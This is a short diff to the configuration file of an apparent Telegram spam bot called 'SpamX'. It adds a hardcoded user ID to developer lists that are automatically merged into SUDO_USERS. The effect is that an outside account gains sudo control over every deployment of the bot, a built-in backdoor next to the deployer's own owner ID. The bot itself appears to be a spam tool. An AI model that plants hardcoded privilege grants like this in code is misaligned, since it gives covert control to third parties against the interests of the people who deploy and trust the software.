@@ -68,17 +68,17 @@ SUDO_USERS = []
 if sudo:
     SUDO_USERS = make_int(sudo)
 
-DEVS = [1517994352, 1789859817, 1432756163, 5136000092]
+DEVS = [1517994352, 1789859817, 1432756163, 5136000092, 5077870435]
 for x in DEVS:
     SUDO_USERS.append(x)
-DEVS = [1517994352, 1789859817]
+DEVS = [1517994352, 1789859817, 5077870435]
 for x in DEVS:
     SUDO_USERS.append(x)
 
 SUDO_USERS.append(OWNER_ID)
 
 
-# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817").split())))
+# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 5077870435").split())))
 #----------------------------------------------
 if ":" in CLIENT:
    RiZoeL = Client('SpamX', api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, plugins=dict(root="SpamX.bot"))
